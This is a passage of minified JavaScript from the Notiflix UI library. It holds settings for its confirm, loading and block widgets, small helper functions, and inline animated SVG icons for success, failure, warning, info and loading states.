rap",className:"notiflix-confirm",width:"300px",zindex:4003,position:"center",distance:"10px",backgroundColor:"#f8f8f8",borderRadius:"25px",backOverlay:!0,backOverlayColor:"rgba(0,0,0,0.5)",rtl:!1,fontFamily:"Quicksand",cssAnimation:!0,cssAnimationDuration:300,cssAnimationStyle:"fade",plainText:!0,titleColor:"#32c682",titleFontSize:"16px",titleMaxLength:34,messageColor:"#1e1e1e",messageFontSize:"14px",messageMaxLength:110,buttonsFontSize:"15px",buttonsMaxLength:34,okButtonColor:"#f8f8f8",okButtonBackground:"#32c682",cancelButtonColor:"#f8f8f8",cancelButtonBackground:"#a9a9a9"},E={Standard:"Standard",Hourglass:"Hourglass",Circle:"Circle",Arrows:"Arrows",Dots:"Dots",Pulse:"Pulse",Custom:"Custom",Notiflix:"Notiflix"},S={ID:"NotiflixLoadingWrap",className:"notiflix-loading",zindex:4e3,backgroundColor:"rgba(0,0,0,0.8)",rtl:!1,fontFamily:"Quicksand",cssAnimation:!0,cssAnimationDuration:400,clickToClose:!1,customSvgUrl:null,customSvgCode:null,svgSize:"80px",svgColor:"#32c682",messageID:"NotiflixLoadingMessage",messageFontSize:"15px",messageMaxLength:34,messageColor:"#dcdcdc"},w={Standard:"Standard",Hourglass:"Hourglass",Circle:"Circle",Arrows:"Arrows",Dots:"Dots",Pulse:"Pulse"},k={ID:"NotiflixBlockWrap",querySelectorLimit:200,className:"notiflix-block",position:"absolute",zindex:1e3,backgroundColor:"rgba(255,255,255,0.9)",rtl:!1,fontFamily:"Quicksand",cssAnimation:!0,cssAnimationDuration:300,svgSize:"45px",svgColor:"#383838",messageFontSize:"14px",messageMaxLength:34,messageColor:"#383838"},C=function(_){return console.error("%c Notiflix Error ","padding:2px;border-radius:20px;color:#fff;background:#ff5549",`
`+_+d)},R=function(_){return console.log("%c Notiflix Info ","padding:2px;border-radius:20px;color:#fff;background:#26c0d3",`
`+_+d)},L=function(_){return _||(_="head"),t.document[_]!==null||(C(`
Notiflix needs to be appended to the "<`+_+'>" element, but you called it before the "<'+_+'>" element has been created.'),!1)},O=function(_,N){if(!L("head"))return!1;if(_()!==null&&!t.document.getElementById(N)){var P=t.document.createElement("style");P.id=N,P.innerHTML=_(),t.document.head.appendChild(P)}},I=function(){var _={},N=!1,P=0;Object.prototype.toString.call(arguments[0])==="[object Boolean]"&&(N=arguments[0],P++);for(var D=function(V){for(var U in V)Object.prototype.hasOwnProperty.call(V,U)&&(_[U]=N&&Object.prototype.toString.call(V[U])==="[object Object]"?I(_[U],V[U]):V[U])};P<arguments.length;P++)D(arguments[P]);return _},A=function(_){var N=t.document.createElement("div");return N.innerHTML=_,N.textContent||N.innerText||""},j=function(_,N){_||(_="110px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" id="NXReportSuccess" width="'+_+'" height="'+_+'" fill="'+N+'" viewBox="0 0 120 120"><style>@-webkit-keyframes NXReportSuccess1-animation{0%{-webkit-transform:translate(60px,57.7px) scale(.5,.5) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(.5,.5) translate(-60px,-57.7px)}50%,to{-webkit-transform:translate(60px,57.7px) scale(1,1) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(1,1) translate(-60px,-57.7px)}60%{-webkit-transform:translate(60px,57.7px) scale(.95,.95) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(.95,.95) translate(-60px,-57.7px)}}@keyframes NXReportSuccess1-animation{0%{-webkit-transform:translate(60px,57.7px) scale(.5,.5) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(.5,.5) translate(-60px,-57.7px)}50%,to{-webkit-transform:translate(60px,57.7px) scale(1,1) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(1,1) translate(-60px,-57.7px)}60%{-webkit-transform:translate(60px,57.7px) scale(.95,.95) translate(-60px,-57.7px);transform:translate(60px,57.7px) scale(.95,.95) translate(-60px,-57.7px)}}@-webkit-keyframes NXReportSuccess4-animation{0%{opacity:0}50%,to{opacity:1}}@keyframes NXReportSuccess4-animation{0%{opacity:0}50%,to{opacity:1}}@-webkit-keyframes NXReportSuccess3-animation{0%{opacity:0}40%,to{opacity:1}}@keyframes NXReportSuccess3-animation{0%{opacity:0}40%,to{opacity:1}}@-webkit-keyframes NXReportSuccess2-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportSuccess2-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}#NXReportSuccess *{-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-timing-function:cubic-bezier(0,0,1,1);animation-timing-function:cubic-bezier(0,0,1,1)}</style><g style="-webkit-animation-name:NXReportSuccess2-animation;animation-name:NXReportSuccess2-animation;-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)"><path d="M60 115.38C29.46 115.38 4.62 90.54 4.62 60 4.62 29.46 29.46 4.62 60 4.62c30.54 0 55.38 24.84 55.38 55.38 0 30.54-24.84 55.38-55.38 55.38zM60 0C26.92 0 0 26.92 0 60s26.92 60 60 60 60-26.92 60-60S93.08 0 60 0z" style="-webkit-animation-name:NXReportSuccess3-animation;animation-name:NXReportSuccess3-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g><g style="-webkit-animation-name:NXReportSuccess1-animation;animation-name:NXReportSuccess1-animation;-webkit-transform:translate(60px,57.7px) scale(1,1) translate(-60px,-57.7px);-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)"><path d="M88.27 35.39L52.8 75.29 31.43 58.2c-.98-.81-2.44-.63-3.24.36-.79.99-.63 2.44.36 3.24l23.08 18.46c.43.34.93.51 1.44.51.64 0 1.27-.26 1.74-.78l36.91-41.53a2.3 2.3 0 0 0-.19-3.26c-.95-.86-2.41-.77-3.26.19z" style="-webkit-animation-name:NXReportSuccess4-animation;animation-name:NXReportSuccess4-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g></svg>';return P},G=function(_,N){_||(_="110px"),N||(N="#ff5549");var P='<svg xmlns="http://www.w3.org/2000/svg" id="NXReportFailure" width="'+_+'" height="'+_+'" fill="'+N+'" viewBox="0 0 120 120"><style>@-webkit-keyframes NXReportFailure2-animation{0%{opacity:0}40%,to{opacity:1}}@keyframes NXReportFailure2-animation{0%{opacity:0}40%,to{opacity:1}}@-webkit-keyframes NXReportFailure1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportFailure1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@-webkit-keyframes NXReportFailure3-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}50%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportFailure3-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}50%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@-webkit-keyframes NXReportFailure4-animation{0%{opacity:0}50%,to{opacity:1}}@keyframes NXReportFailure4-animation{0%{opacity:0}50%,to{opacity:1}}#NXReportFailure *{-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-timing-function:cubic-bezier(0,0,1,1);animation-timing-function:cubic-bezier(0,0,1,1)}</style><g style="-webkit-animation-name:NXReportFailure1-animation;animation-name:NXReportFailure1-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)"><path d="M4.35 34.95c0-16.82 13.78-30.6 30.6-30.6h50.1c16.82 0 30.6 13.78 30.6 30.6v50.1c0 16.82-13.78 30.6-30.6 30.6h-50.1c-16.82 0-30.6-13.78-30.6-30.6v-50.1zM34.95 120h50.1c19.22 0 34.95-15.73 34.95-34.95v-50.1C120 15.73 104.27 0 85.05 0h-50.1C15.73 0 0 15.73 0 34.95v50.1C0 104.27 15.73 120 34.95 120z" style="-webkit-animation-name:NXReportFailure2-animation;animation-name:NXReportFailure2-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g><g style="-webkit-animation-name:NXReportFailure3-animation;animation-name:NXReportFailure3-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)"><path d="M82.4 37.6c-.9-.9-2.37-.9-3.27 0L60 56.73 40.86 37.6a2.306 2.306 0 0 0-3.26 3.26L56.73 60 37.6 79.13c-.9.9-.9 2.37 0 3.27.45.45 1.04.68 1.63.68.59 0 1.18-.23 1.63-.68L60 63.26 79.13 82.4c.45.45 1.05.68 1.64.68.58 0 1.18-.23 1.63-.68.9-.9.9-2.37 0-3.27L63.26 60 82.4 40.86c.9-.91.9-2.36 0-3.26z" style="-webkit-animation-name:NXReportFailure4-animation;animation-name:NXReportFailure4-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g></svg>';return P},X=function(_,N){_||(_="110px"),N||(N="#eebf31");var P='<svg xmlns="http://www.w3.org/2000/svg" id="NXReportWarning" width="'+_+'" height="'+_+'" fill="'+N+'" viewBox="0 0 120 120"><style>@-webkit-keyframes NXReportWarning2-animation{0%{opacity:0}40%,to{opacity:1}}@keyframes NXReportWarning2-animation{0%{opacity:0}40%,to{opacity:1}}@-webkit-keyframes NXReportWarning1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportWarning1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@-webkit-keyframes NXReportWarning3-animation{0%{-webkit-transform:translate(60px,66.6px) scale(.5,.5) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(.5,.5) translate(-60px,-66.6px)}50%,to{-webkit-transform:translate(60px,66.6px) scale(1,1) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(1,1) translate(-60px,-66.6px)}60%{-webkit-transform:translate(60px,66.6px) scale(.95,.95) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(.95,.95) translate(-60px,-66.6px)}}@keyframes NXReportWarning3-animation{0%{-webkit-transform:translate(60px,66.6px) scale(.5,.5) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(.5,.5) translate(-60px,-66.6px)}50%,to{-webkit-transform:translate(60px,66.6px) scale(1,1) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(1,1) translate(-60px,-66.6px)}60%{-webkit-transform:translate(60px,66.6px) scale(.95,.95) translate(-60px,-66.6px);transform:translate(60px,66.6px) scale(.95,.95) translate(-60px,-66.6px)}}@-webkit-keyframes NXReportWarning4-animation{0%{opacity:0}50%,to{opacity:1}}@keyframes NXReportWarning4-animation{0%{opacity:0}50%,to{opacity:1}}#NXReportWarning *{-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-timing-function:cubic-bezier(0,0,1,1);animation-timing-function:cubic-bezier(0,0,1,1)}</style><g style="-webkit-animation-name:NXReportWarning1-animation;animation-name:NXReportWarning1-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)"><path d="M115.46 106.15l-54.04-93.8c-.61-1.06-2.23-1.06-2.84 0l-54.04 93.8c-.62 1.07.21 2.29 1.42 2.29h108.08c1.21 0 2.04-1.22 1.42-2.29zM65.17 10.2l54.04 93.8c2.28 3.96-.65 8.78-5.17 8.78H5.96c-4.52 0-7.45-4.82-5.17-8.78l54.04-93.8c2.28-3.95 8.03-4 10.34 0z" style="-webkit-animation-name:NXReportWarning2-animation;animation-name:NXReportWarning2-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g><g style="-webkit-animation-name:NXReportWarning3-animation;animation-name:NXReportWarning3-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,66.6px) scale(1,1) translate(-60px,-66.6px)"><path d="M57.83 94.01c0 1.2.97 2.17 2.17 2.17s2.17-.97 2.17-2.17v-3.2c0-1.2-.97-2.17-2.17-2.17s-2.17.97-2.17 2.17v3.2zm0-14.15c0 1.2.97 2.17 2.17 2.17s2.17-.97 2.17-2.17V39.21c0-1.2-.97-2.17-2.17-2.17s-2.17.97-2.17 2.17v40.65z" style="-webkit-animation-name:NXReportWarning4-animation;animation-name:NXReportWarning4-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g></svg>';return P},q=function(_,N){_||(_="110px"),N||(N="#26c0d3");var P='<svg xmlns="http://www.w3.org/2000/svg" id="NXReportInfo" width="'+_+'" height="'+_+'" fill="'+N+'" viewBox="0 0 120 120"><style>@-webkit-keyframes NXReportInfo4-animation{0%{opacity:0}50%,to{opacity:1}}@keyframes NXReportInfo4-animation{0%{opacity:0}50%,to{opacity:1}}@-webkit-keyframes NXReportInfo3-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}50%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportInfo3-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}50%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@-webkit-keyframes NXReportInfo2-animation{0%{opacity:0}40%,to{opacity:1}}@keyframes NXReportInfo2-animation{0%{opacity:0}40%,to{opacity:1}}@-webkit-keyframes NXReportInfo1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}@keyframes NXReportInfo1-animation{0%{-webkit-transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px);transform:translate(60px,60px) scale(.5,.5) translate(-60px,-60px)}40%,to{-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px);transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)}60%{-webkit-transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px);transform:translate(60px,60px) scale(.95,.95) translate(-60px,-60px)}}#NXReportInfo *{-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-timing-function:cubic-bezier(0,0,1,1);animation-timing-function:cubic-bezier(0,0,1,1)}</style><g style="-webkit-animation-name:NXReportInfo1-animation;animation-name:NXReportInfo1-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)"><path d="M60 115.38C29.46 115.38 4.62 90.54 4.62 60 4.62 29.46 29.46 4.62 60 4.62c30.54 0 55.38 24.84 55.38 55.38 0 30.54-24.84 55.38-55.38 55.38zM60 0C26.92 0 0 26.92 0 60s26.92 60 60 60 60-26.92 60-60S93.08 0 60 0z" style="-webkit-animation-name:NXReportInfo2-animation;animation-name:NXReportInfo2-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g><g style="-webkit-animation-name:NXReportInfo3-animation;animation-name:NXReportInfo3-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform:translate(60px,60px) scale(1,1) translate(-60px,-60px)"><path d="M57.75 43.85c0-1.24 1.01-2.25 2.25-2.25s2.25 1.01 2.25 2.25v48.18c0 1.24-1.01 2.25-2.25 2.25s-2.25-1.01-2.25-2.25V43.85zm0-15.88c0-1.24 1.01-2.25 2.25-2.25s2.25 1.01 2.25 2.25v3.32c0 1.25-1.01 2.25-2.25 2.25s-2.25-1-2.25-2.25v-3.32z" style="-webkit-animation-name:NXReportInfo4-animation;animation-name:NXReportInfo4-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1)" fill="inherit" data-animator-group="true" data-animator-type="2"/></g></svg>';return P},J=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" stroke="'+N+'" width="'+_+'" height="'+_+'" transform="scale(.8)" viewBox="0 0 38 38"><g fill="none" fill-rule="evenodd" stroke-width="2" transform="translate(1 1)"><circle cx="18" cy="18" r="18" stroke-opacity=".25"/><path d="M36 18c0-9.94-8.06-18-18-18"><animateTransform attributeName="transform" dur="1s" from="0 18 18" repeatCount="indefinite" to="360 18 18" type="rotate"/></path></g></svg>';return P},K=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" id="NXLoadingHourglass" fill="'+N+'" width="'+_+'" height="'+_+'" viewBox="0 0 200 200"><style>@-webkit-keyframes NXhourglass5-animation{0%{-webkit-transform:scale(1,1);transform:scale(1,1)}16.67%{-webkit-transform:scale(1,.8);transform:scale(1,.8)}33.33%{-webkit-transform:scale(.88,.6);transform:scale(.88,.6)}37.5%{-webkit-transform:scale(.85,.55);transform:scale(.85,.55)}41.67%{-webkit-transform:scale(.8,.5);transform:scale(.8,.5)}45.83%{-webkit-transform:scale(.75,.45);transform:scale(.75,.45)}50%{-webkit-transform:scale(.7,.4);transform:scale(.7,.4)}54.17%{-webkit-transform:scale(.6,.35);transform:scale(.6,.35)}58.33%{-webkit-transform:scale(.5,.3);transform:scale(.5,.3)}83.33%,to{-webkit-transform:scale(.2,0);transform:scale(.2,0)}}@keyframes NXhourglass5-animation{0%{-webkit-transform:scale(1,1);transform:scale(1,1)}16.67%{-webkit-transform:scale(1,.8);transform:scale(1,.8)}33.33%{-webkit-transform:scale(.88,.6);transform:scale(.88,.6)}37.5%{-webkit-transform:scale(.85,.55);transform:scale(.85,.55)}41.67%{-webkit-transform:scale(.8,.5);transform:scale(.8,.5)}45.83%{-webkit-transform:scale(.75,.45);transform:scale(.75,.45)}50%{-webkit-transform:scale(.7,.4);transform:scale(.7,.4)}54.17%{-webkit-transform:scale(.6,.35);transform:scale(.6,.35)}58.33%{-webkit-transform:scale(.5,.3);transform:scale(.5,.3)}83.33%,to{-webkit-transform:scale(.2,0);transform:scale(.2,0)}}@-webkit-keyframes NXhourglass3-animation{0%{-webkit-transform:scale(1,.02);transform:scale(1,.02)}79.17%,to{-webkit-transform:scale(1,1);transform:scale(1,1)}}@keyframes NXhourglass3-animation{0%{-webkit-transform:scale(1,.02);transform:scale(1,.02)}79.17%,to{-webkit-transform:scale(1,1);transform:scale(1,1)}}@-webkit-keyframes NXhourglass1-animation{0%,83.33%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(180deg);transform:rotate(180deg)}}@keyframes NXhourglass1-animation{0%,83.33%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(180deg);transform:rotate(180deg)}}#NXLoadingHourglass *{-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-timing-function:cubic-bezier(0,0,1,1);animation-timing-function:cubic-bezier(0,0,1,1)}</style><g data-animator-group="true" data-animator-type="1" style="-webkit-animation-name:NXhourglass1-animation;animation-name:NXhourglass1-animation;-webkit-transform-origin:50% 50%;transform-origin:50% 50%;transform-box:fill-box"><g id="NXhourglass2" fill="inherit"><g data-animator-group="true" data-animator-type="2" style="-webkit-animation-name:NXhourglass3-animation;animation-name:NXhourglass3-animation;-webkit-animation-timing-function:cubic-bezier(.42,0,.58,1);animation-timing-function:cubic-bezier(.42,0,.58,1);-webkit-transform-origin:50% 100%;transform-origin:50% 100%;transform-box:fill-box" opacity=".4"><path id="NXhourglass4" d="M100 100l-34.38 32.08v31.14h68.76v-31.14z"/></g><g data-animator-group="true" data-animator-type="2" style="-webkit-animation-name:NXhourglass5-animation;animation-name:NXhourglass5-animation;-webkit-transform-origin:50% 100%;transform-origin:50% 100%;transform-box:fill-box" opacity=".4"><path id="NXhourglass6" d="M100 100L65.62 67.92V36.78h68.76v31.14z"/></g><path d="M51.14 38.89h8.33v14.93c0 15.1 8.29 28.99 23.34 39.1 1.88 1.25 3.04 3.97 3.04 7.08s-1.16 5.83-3.04 7.09c-15.05 10.1-23.34 23.99-23.34 39.09v14.93h-8.33a4.859 4.859 0 1 0 0 9.72h97.72a4.859 4.859 0 1 0 0-9.72h-8.33v-14.93c0-15.1-8.29-28.99-23.34-39.09-1.88-1.26-3.04-3.98-3.04-7.09s1.16-5.83 3.04-7.08c15.05-10.11 23.34-24 23.34-39.1V38.89h8.33a4.859 4.859 0 1 0 0-9.72H51.14a4.859 4.859 0 1 0 0 9.72zm79.67 14.93c0 15.87-11.93 26.25-19.04 31.03-4.6 3.08-7.34 8.75-7.34 15.15 0 6.41 2.74 12.07 7.34 15.15 7.11 4.78 19.04 15.16 19.04 31.03v14.93H69.19v-14.93c0-15.87 11.93-26.25 19.04-31.02 4.6-3.09 7.34-8.75 7.34-15.16 0-6.4-2.74-12.07-7.34-15.15-7.11-4.78-19.04-15.16-19.04-31.03V38.89h61.62v14.93z"/></g></g></svg>';return P},le=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" width="'+_+'" height="'+_+'" viewBox="25 25 50 50" style="-webkit-animation:rotate 2s linear infinite;animation:rotate 2s linear infinite;height:'+_+";-webkit-transform-origin:center center;-ms-transform-origin:center center;transform-origin:center center;width:"+_+';position:absolute;top:0;left:0;margin:auto"><style>@-webkit-keyframes rotate{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes rotate{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:89,200;stroke-dashoffset:-35}to{stroke-dasharray:89,200;stroke-dashoffset:-124}}@keyframes dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:89,200;stroke-dashoffset:-35}to{stroke-dasharray:89,200;stroke-dashoffset:-124}}</style><circle cx="50" cy="50" r="20" fill="none" stroke="'+N+'" stroke-width="2" style="-webkit-animation:dash 1.5s ease-in-out infinite,color 1.5s ease-in-out infinite;animation:dash 1.5s ease-in-out infinite,color 1.5s ease-in-out infinite" stroke-dasharray="150 200" stroke-dashoffset="-10" stroke-linecap="round"/></svg>';return P},se=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" fill="'+N+'" width="'+_+'" height="'+_+'" viewBox="0 0 128 128"><g><path fill="inherit" d="M109.25 55.5h-36l12-12a29.54 29.54 0 0 0-49.53 12H18.75A46.04 46.04 0 0 1 96.9 31.84l12.35-12.34v36zm-90.5 17h36l-12 12a29.54 29.54 0 0 0 49.53-12h16.97A46.04 46.04 0 0 1 31.1 96.16L18.74 108.5v-36z"/><animateTransform attributeName="transform" dur="1.5s" from="0 64 64" repeatCount="indefinite" to="360 64 64" type="rotate"/></g></svg>';return P},de=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" fill="'+N+'" width="'+_+'" height="'+_+'" viewBox="0 0 100 100"><g transform="translate(25 50)"><circle r="9" fill="inherit" transform="scale(.239)"><animateTransform attributeName="transform" begin="-0.266s" calcMode="spline" dur="0.8s" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" keyTimes="0;0.5;1" repeatCount="indefinite" type="scale" values="0;1;0"/></circle></g><g transform="translate(50 50)"><circle r="9" fill="inherit" transform="scale(.00152)"><animateTransform attributeName="transform" begin="-0.133s" calcMode="spline" dur="0.8s" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" keyTimes="0;0.5;1" repeatCount="indefinite" type="scale" values="0;1;0"/></circle></g><g transform="translate(75 50)"><circle r="9" fill="inherit" transform="scale(.299)"><animateTransform attributeName="transform" begin="0s" calcMode="spline" dur="0.8s" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" keyTimes="0;0.5;1" repeatCount="indefinite" type="scale" values="0;1;0"/></circle></g></svg>';return P},oe=function(_,N){_||(_="60px"),N||(N="#32c682");var P='<svg xmlns="http://www.w3.org/2000/svg" stroke="'+N+'" width="'+_+'" height="'+_+'" viewBox="0 0 44 44"><g fill="none" fill-rule="evenodd" stroke-width="2"><circle cx="22" cy="22" r="1"><animate attributeName="r" begin="0s" calcMode="spline" dur="1.8s" keySplines="0.165, 0.84, 0.44, 1" keyTimes="0; 1" repeatCount="indefinite" values="1; 20"/><animate attributeName="stroke-opacity" begin="0s" calcMode="spline" dur="1.8s" keySplines="0.3, 0.61, 0.355, 1" keyTimes="0; 1" repeatCount="indefinite" values="1; 0"/></circle><circle cx="22" cy="22" r="1"><animate attributeName="r" begin="-0.9s" calcMode="spline" dur="1.8s" keySplines="0.165, 0.84, 0.44, 1" keyTimes="0; 1" repeatCount="indefinite" values="1; 20"/><animate attributeName="stroke-opacity" begin="-0.9s" calcMode="spline" dur="1.8s" keySplines="0.3, 0.61, 0.355, 1" keyTimes="0; 1" repeatCount="indefinite" values="1; 0"/></circle></g></svg>';return P},ge=function(_,N,P){_||(_="60px"),N||(N="#f8f8f8"),P||(P="#32c682");var D='<svg xmlns="http://www.w3.org/2000/svg" 